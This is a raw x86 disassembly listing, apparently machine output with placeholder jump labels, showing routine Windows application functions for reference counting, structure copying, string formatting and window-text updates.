sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp esi edx
jae r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
inc [ esi ]
lea esi [ esi + esi * 4 ]
shl esi 0x5
mov al [ esi + edi + 0x4 ]
test al al
jne r-xdata
mov eax [ ebp + 0x20 ]
test eax eax
mov ebx esi
mov [ ebp - 0x30 ] ebx
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov esi [ ebp - 0x34 ]
mov ebx [ ebp - 0x18 ]
inc esi
jmp r-xdata
mov edi [ esi + edi ]
cmp edi 0x1
mov ecx [ ebp - 0x1c ]
mov [ ecx + 0x78 ] edi
jne r-xdata
test esi esi
mov [ ebp - 0x4 ] 0x3
jne r-xdata
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
dec [ ecx ]
mov eax [ ecx + 0x4 ]
dec [ eax + 0xc ]
mov ecx [ ebp + 0x20 ]
mov edi [ ecx + 0x4 ]
test edi edi
mov [ ebp - 0x34 ] esi
je r-xdata
mov eax [ ebp + 0x20 ]
mov eax [ eax + 0x4 ]
add eax esi
push eax
lea ecx [ ebp - 0x15c ]
call sub_413d70
test ebx ebx
mov [ ebp - 0x8c ] 0x63
je r-xdata
push 0x30
call sub_4b573e
mov ecx eax
add esp 0x4
mov [ ebp - 0x2c ] ecx
test ecx ecx
mov [ ebp - 0x4 ] 0x6
je r-xdata
mov edi [ ebp - 0x18 ]
mov eax [ edi ]
push edi
call [ eax + 0x14 ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x20 ]
mov esi [ ebp + 0x8 ]
or ecx 0x1
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0x18 ]
mov [ esi ] 0x0
mov eax [ ecx + 0x4 ]
dec eax
mov [ ebp - 0x4 ] 0x1
mov [ ecx + 0x4 ] eax
jne r-xdata
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
mov [ ebp - 0x88 ] ebx
test ebx ebx
mov esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x15
je r-xdata
inc [ ebx + 0x4 ]
xor edi edi
xor ebx ebx
jmp r-xdata
test ebx ebx
push ecx
mov [ ebp - 0x14 ] esp
mov eax esp
je r-xdata
mov edx [ edi ]
push edi
call [ edx + 0x14 ]
cmp [ eax + 0x14 ] 0xa0000008
jne r-xdata
mov edi [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov [ edi ] 0x20000008
mov ecx [ esi + 0x10 ]
mov [ edx ] ecx
mov eax [ esi + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x1c ]
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
cmp [ esi ] 0x63
jne r-xdata
inc [ ebx + 0x4 ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov edx [ ebp + 0x20 ]
mov eax [ edx + 0x4 ]
mov ecx [ esi + eax + 0x50 ]
cmp ecx ebx
mov [ ebp - 0x4 ] 0x8
jne r-xdata
mov [ eax ] ebx
call sub_40a9b0
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
inc [ ebx + 0x4 ]
mov eax [ edi ]
push edi
call [ eax + 0x14 ]
cmp [ eax + 0x14 ] 0x60000004
jne r-xdata
mov edi [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov [ edi ] 0x2000000c
mov eax [ edx ]
test al 0x1
je r-xdata
mov [ ecx + eax * 4 + 0x2a ] al
mov [ ecx + eax * 4 + 0x29 ] al
mov [ ecx + eax * 4 + 0x28 ] al
inc eax
cmp eax 0x100
jl r-xdata
mov [ ecx + 0xe ] 0x8
mov eax [ ebx + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebx + 0x14 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
dec [ edi + 0xd48 ]
jne r-xdata
test ebx ebx
mov eax [ ebp - 0x8c ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] 0x14
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + eax + 0x54 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
inc [ edi + 0x4 ]
mov eax [ edi ]
push edi
call [ eax + 0x14 ]
cmp [ eax + 0x14 ] 0x50000001
jne r-xdata
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x10 ]
mov [ edi ] 0x20000010
mov ecx [ ebx ]
test cl 0x1
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edx ] eax
mov ecx [ esi + 0x10 ]
dec ecx
cmp eax ecx
je r-xdata
mov [ ecx + 0x10 ] 0x0
call [ timeGetTime@IAT ]
mov ecx [ ebp - 0x38 ]
cmp eax ecx
jb r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ ebp - 0x10c ]
test ecx ecx
jne r-xdata
dec [ ebx + 0x4 ]
jne r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov [ ebp - 0x90 ] edi
cmp edi ebx
mov [ ebp - 0x4 ] 0x9
je r-xdata
inc [ edi + 0x4 ]
sub esp 0x8
mov ecx esp
mov [ ebp - 0x14 ] esp
mov [ ecx ] 0x76
push eax
lea ecx [ ebp - 0x48 ]
call sub_40d900
cmp edi ebx
mov [ ebp - 0x94 ] 0x63
je r-xdata
mov ecx [ edi ]
push edi
call [ ecx + 0x14 ]
cmp [ eax + 0x14 ] 0x50000002
jne r-xdata
mov edi [ ebp + 0x18 ]
mov [ edi ] 0x10000018
mov ecx [ esi + 0x10 ]
mov eax 0x55555556
imul ecx
mov eax [ ebp + 0x10 ]
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ecx + 0xe ] 0x18
mov edx [ esi + 0xc ]
mov eax 0x55555556
imul edx
mov eax edx
shr eax 0x1f
add edx eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov eax [ esi + 0x10 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebx ] eax
mov eax [ esi + 0x10 ]
cdq
sub eax edx
sar eax 0x1
dec eax
cmp ecx eax
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ edx ] ecx
mov ecx [ esi + 0x14 ]
dec ecx
cmp eax ecx
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
test al 0x1
je r-xdata
sub eax [ ebp - 0x38 ]
dec eax
sub eax ecx
jmp r-xdata
mov eax [ ebp - 0x108 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov edx [ ebx ]
push 0x1
mov ecx ebx
call [ edx + 0x18 ]
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
mov ebx [ ebp - 0x44 ]
cmp [ ebx ] 0x63
jne r-xdata
inc [ edi + 0x4 ]
mov ebx [ ebp - 0x1c ]
lea edi [ ebx + 0x80 ]
push r--data
mov ecx edi
call sub_402010
mov al [ rw-data ]
test al al
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi ] 0x40000020
je r-xdata
mov esi [ esi + 0x14 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x14 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ecx + 0xe ] 0x8
mov eax [ esi + 0xc ]
mov [ ecx + 0x4 ] eax
mov esi [ esi + 0x14 ]
neg esi
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ecx + 0xe ] 0x8
mov eax [ esi + 0xc ]
mov [ ecx + 0x4 ] eax
mov esi [ esi + 0x14 ]
lea eax [ esi + 0x1 ]
cdq
sub eax edx
sar eax 0x1
neg eax
lea edx [ eax + eax * 2 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x1c ]
sub eax edx
push eax
lea edx [ ebp - 0x35c ]
lea esi [ edi + 0x80 ]
push edx
mov ecx esi
call sub_401cc0
mov ecx [ edi + 0x38 ]
test ecx ecx
jne r-xdata
mov edx [ edi ]
push edx
mov ebx eax
call sub_4358c0
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov eax [ edx ]
push ecx
push eax
lea ecx [ ebp - 0x35c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x35c ]
add esp 0x18
lea edx [ eax + 0x1 ]
mov ecx [ eax ]
mov edi [ eax + 0x4 ]
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x74 ] edi
cmp [ ebp - 0x9c ] 0x63
mov [ ebp - 0x4 ] 0x19
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x6c ] 0x61
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x6a ] ax
mov eax [ ebp - 0x154 ]
mov esi [ ebp - 0x1c ]
mov edx [ esi + 0x28 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
add eax edx
mov eax [ eax + 0x9c ]
mov edx [ ebp - 0x6c ]
push esi
push eax
sub esp 0x8
mov eax esp
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov eax [ esi + 0x18 ]
mov edx [ ebp - 0x154 ]
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x70 ] esp
push ecx
mov [ ebp - 0x4 ] 0x16
call [ eax + edx * 4 ]
add esp 0x14
cmp [ eax ] 0x63
jne r-xdata
test edi edi
mov ecx [ ebp - 0x94 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] edi
mov [ ebp - 0x4 ] 0x8
je r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ edi ] 0x0
mov eax [ esi ]
or ecx 0x1
cmp eax 0x1
mov [ ebp - 0x20 ] ecx
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x14 ]
cdq
and edx 0x3
add eax edx
mov edx [ ebp + 0x10 ]
sar eax 0x2
mov [ edx ] eax
mov eax [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x1c ]
mov [ ecx + 0xe ] 0x20
mov eax [ esi + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ecx + 0x4 ] eax
mov [ edi ] 0x10000020
mov eax [ edi + 0x3c ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x78 ]
call sub_40a400
mov esi [ eax ]
test esi esi
mov [ ebp - 0x4 ] 0x1a
je r-xdata
mov eax [ ebp - 0x98 ]
test eax eax
je r-xdata
inc [ ecx + 0x4 ]
mov edi [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x1
dec [ edi + 0x4 ]
jne r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
dec [ esi ]
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x4 ]
dec eax
mov [ ebp - 0x4 ] 0x1
mov [ ecx + 0x4 ] eax
jne r-xdata
mov eax [ esi + 0x4 ]
dec [ eax + 0xc ]
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x35c ]
push ecx
mov ecx esi
call sub_401cc0
mov al [ rw-data ]
test al al
jne r-xdata
push eax
push ebx
lea eax [ ebp - 0x35c ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x35c ]
add esp 0x10
lea edx [ eax + 0x1 ]
test ebx ebx
je r-xdata
inc [ esi + 0x4 ]
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ esi + eax + 0x54 ]
sub ecx edx
mov edx [ ebp - 0x14 ]
sar ecx 0x3
cmp edx ecx
jae r-xdata
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx + 0x14 ]
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
mov esi [ ebp + 0xc ]
test esi esi
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
jmp r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov esi [ ecx ]
mov edi [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
inc esi
mov [ ecx ] esi
mov [ edi ] ecx
mov eax [ ecx ]
or edx 0x1
cmp eax 0x1
mov [ ebp - 0x20 ] edx
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ ebp - 0x54 ]
test eax eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x19
je r-xdata
dec [ ebx + 0x4 ]
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
mov eax [ ebp - 0x40 ]
sub eax ebx
sar eax 0x3
xor eax eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x76
mov ecx [ eax + esi + 0x50 ]
cmp [ ecx + edx * 8 ] 0x62
mov [ ebp - 0x4 ] 0xa
jne r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx [ ebx + 0x7c ]
push edi
push ecx
call [ SetWindowTextA@IAT ]
dec [ ecx ]
mov ecx [ ebp - 0x18 ]
test ecx ecx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ecx + 0x4 ]
dec [ eax + 0xc ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
cmp [ ebp - 0x78 ] 0x63
mov [ ebp - 0x4 ] 0x16
jne r-xdata
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov edx [ ebx ]
push 0x1
mov ecx ebx
call [ edx + 0x18 ]
mov ebx [ eax ]
mov edi [ eax + 0x4 ]
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xa8 ] edi
cmp [ ebp - 0xa4 ] 0x63
mov [ ebp - 0x4 ] 0x12
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x80 ] 0x61
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x7e ] ax
mov eax [ ebp + 0x20 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x8 ]
mov eax [ eax + esi + 0x8 ]
mov edi [ ebp - 0x1c ]
mov edx [ edi + 0x18 ]
mov ecx [ edx + ecx * 4 ]
mov edx [ edi + 0x28 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
add eax edx
mov edx [ eax + 0x9c ]
push edi
push edx
mov edx [ ebp - 0x80 ]
sub esp 0x8
mov eax esp
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
lea eax [ ebp - 0xa4 ]
mov [ ebp - 0x14 ] esp
push eax
mov [ ebp - 0x4 ] 0xf
call ecx
add esp 0x14
cmp [ eax ] 0x63
jne r-xdata
mov ecx [ eax + esi + 0x50 ]
cmp [ ecx + edx * 8 ] 0x69
mov edx [ ebp - 0x14 ]
jne r-xdata
mov eax ecx
mov al [ eax + edx * 8 + 0x4 ]
mov [ ebp - 0x64 ] 0x62
mov [ ebp - 0x60 ] al
mov eax [ ebp - 0x64 ]
mov edi [ ebp - 0x60 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
dec [ ecx + 0x4 ]
jne r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea ecx [ ebp - 0x15c ]
mov [ ebp - 0x4 ] 0x5
call sub_413c10
test edi edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
push 0x40
call sub_4b573e
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
test esi esi
mov [ ebp - 0x4 ] 0x13
je r-xdata
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
inc [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x50 ]
mov cx [ ecx + edx * 8 ]
cmp cx 0x66
je r-xdata
mov eax ecx
mov eax [ eax + edx * 8 + 0x4 ]
mov [ ebp - 0xbc ] 0x69
mov ecx [ ebp - 0xbc ]
jmp r-xdata
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x4 ] 0xa
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
mov edx [ edi + 0x7c ]
push esi
push edx
call [ SetWindowTextA@IAT ]
dec [ edi + 0x4 ]
jne r-xdata
xor esi esi
push ecx
mov eax esp
mov [ ebp - 0x70 ] esp
push eax
lea ecx [ ebp - 0xac ]
call sub_40a400
mov ecx esi
call sub_40a760
mov esi eax
jmp r-xdata
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov eax [ eax + esi + 0x50 ]
mov edx [ ebp - 0x14 ]
cmp [ eax + edx * 8 ] 0x69
jne r-xdata
cmp cx 0x69
jne r-xdata
mov [ ebp - 0x28 ] ecx
mov edi eax
cmp [ ebx + edx * 8 ] 0x63
jne r-xdata
test edi edi
je r-xdata
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx + 0x18 ]
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
inc [ esi + 0x4 ]
test esi esi
mov [ ebp - 0x4 ] 0x12
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x14 ]
fld [ eax + edx * 8 + 0x4 ]
fild [ eax + edx * 8 + 0x4 ]
jmp r-xdata
mov ecx [ eax + esi + 0x50 ]
mov edx [ ebp - 0x14 ]
cmp [ ecx + edx * 8 ] 0x73
jne r-xdata
mov eax [ ebp - 0x28 ]
cmp ax 0x63
mov [ ebx + edx * 8 ] eax
mov [ ebx + edx * 8 + 0x4 ] edi
mov [ ebp - 0x4 ] 0x8
jne r-xdata
mov ecx [ ebx + edx * 8 + 0x4 ]
test ecx ecx
je r-xdata
inc [ edi + 0x4 ]
cmp bx 0x63
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0xf
jne r-xdata
dec [ eax + 0x4 ]
jne r-xdata
fstp [ ebp - 0x58 ]
mov [ ebp - 0x5c ] 0x66
mov eax [ ebp - 0x5c ]
mov edi [ ebp - 0x58 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
cmp [ ebp - 0x28 ] 0x63
jne r-xdata
mov eax ecx
cmp [ eax + edx * 8 ] 0x73
jne r-xdata
inc edx
mov [ ebp - 0x14 ] edx
jmp r-xdata
test edi edi
je r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov esi [ ebp - 0x44 ]
test esi esi
mov [ ebp - 0x4 ] 0x7
je r-xdata
test edi edi
je r-xdata
mov ecx eax
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
xor eax eax
mov eax [ eax + edx * 8 + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x20 ]
mov eax [ eax + 0x4 ]
mov edx [ esi + eax + 0x50 ]
test edx edx
je r-xdata
dec [ edi + 0x4 ]
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x14 ]
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x2c ]
xor eax eax
cmp ecx eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x4 ] 0x5
je r-xdata
cmp esi [ ebp - 0x40 ]
je r-xdata
dec [ edi + 0x4 ]
jne r-xdata
mov [ ebp - 0xb4 ] 0x73
mov ecx [ ebp - 0xb4 ]
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx + 0x14 ]
mov edx [ ebp - 0x14 ]
mov eax ecx
dec [ eax + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0x44 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_40b100
add esi 0x8
jmp r-xdata
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x14 ]
mov ecx eax
mov edx [ ecx ]
push 0x1
call [ edx + 0x14 ]
mov esi [ ebp - 0x34 ]
mov ebx [ ebp - 0x18 ]
inc esi
jmp r-xdata
sub_414ba0
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
or [ ebp - 0x20 ] 0x1
mov eax sub_414bea
retn
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x98 ] 0x10
jb r-xdata
lea ecx [ eax + 0x84 ]
mov ecx [ eax + 0x84 ]
jmp r-xdata
mov eax [ eax + 0x7c ]
push ecx
push eax
call [ SetWindowTextA@IAT ]
sub_414bea
lea ecx [ ebp - 0x30 ]
call sub_40a3b0
mov ecx [ ebp - 0x18 ]
test ecx ecx
mov [ ebp - 0x4 ] 0x1
je r-xdata
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
call sub_40b360
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x1c
dec [ ecx + 0x4 ]
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
sub_414c30
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
mov esi ecx
mov [ esi ] eax
mov cl [ edi + 0x4 ]
mov [ esi + 0x4 ] cl
mov edx [ edi + 0x8 ]
push 0xffffffff
push 0x0
lea ecx [ edi + 0x10 ]
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_401dd0
lea edx [ edi + 0x2c ]
push edx
lea ecx [ esi + 0x2c ]
call sub_40dd80
lea eax [ edi + 0x3c ]
push eax
lea ecx [ esi + 0x3c ]
call sub_40d3d0
lea ecx [ edi + 0x4c ]
push ecx
lea ecx [ esi + 0x4c ]
call sub_40d5b0
lea edx [ edi + 0x5c ]
push edx
lea ecx [ esi + 0x5c ]
call sub_40dd80
lea eax [ edi + 0x6c ]
push eax
lea ecx [ esi + 0x6c ]
call sub_40dd80
lea ecx [ edi + 0x7c ]
push ecx
lea ecx [ esi + 0x7c ]
call sub_40d7d0
lea edx [ edi + 0x8c ]
push edx
lea ecx [ esi + 0x8c ]
call sub_413e70
mov eax [ edi + 0x9c ]
mov [ esi + 0x9c ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_414cd0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ esp + 0x18 ]
push ebx
mov ecx esi
call sub_414c30
add esi 0xa0
cmp esi edi
jne r-xdata
pop ebx
sub_414d00
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push esi
mov ecx edi
call sub_414c30
add esi 0xa0
add edi 0xa0
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_414d40
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
pop esi
mov [ eax ] ecx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
sub esi 0xa0
sub edi 0xa0
push esi
mov ecx edi
call sub_414c30
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub_414d90
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_414d40
add esp 0x14
mov eax esi
pop esi
retn
sub_414dd0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf671
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0xa0
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0xa0
jmp r-xdata
push edi
mov ecx esi
call sub_413d70
cmp edi [ ebp + 0xc ]
je r-xdata
sub_414e2c
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_413c10
add esi 0xa0
cmp esi edi
jne r-xdata
sub_414e70
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf691
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
dec edi
add esi 0xa0
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx esi
call sub_413d70
cmp edi ebx
jbe r-xdata
sub_414ec9
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_413c10
add esi 0xa0
cmp esi edi
jne r-xdata
sub_414f20
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_414dd0
add esp 0x14
retn 0xc
sub_414f50
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_413c10
add esi 0xa0
cmp esi edi
jne r-xdata
sub_414f80
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_413c10
add esi 0xa0
cmp esi edi
jne r-xdata
sub_414fd0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_414e70
lea eax [ esi + esi * 4 ]
add esp 0x14
shl eax 0x5
add eax edi
pop edi
pop esi
retn 0xc
sub_415000
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ebp ecx
mov ecx [ esp + 0x10 ]
cmp ecx edx
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
pop ebx
retn 0xc
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
push esi
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_414d00
mov ebx [ ebp + 0x8 ]
mov esi eax
add esp 0x10
cmp esi ebx
mov edi esi
je r-xdata
mov ecx [ esp + 0x18 ]
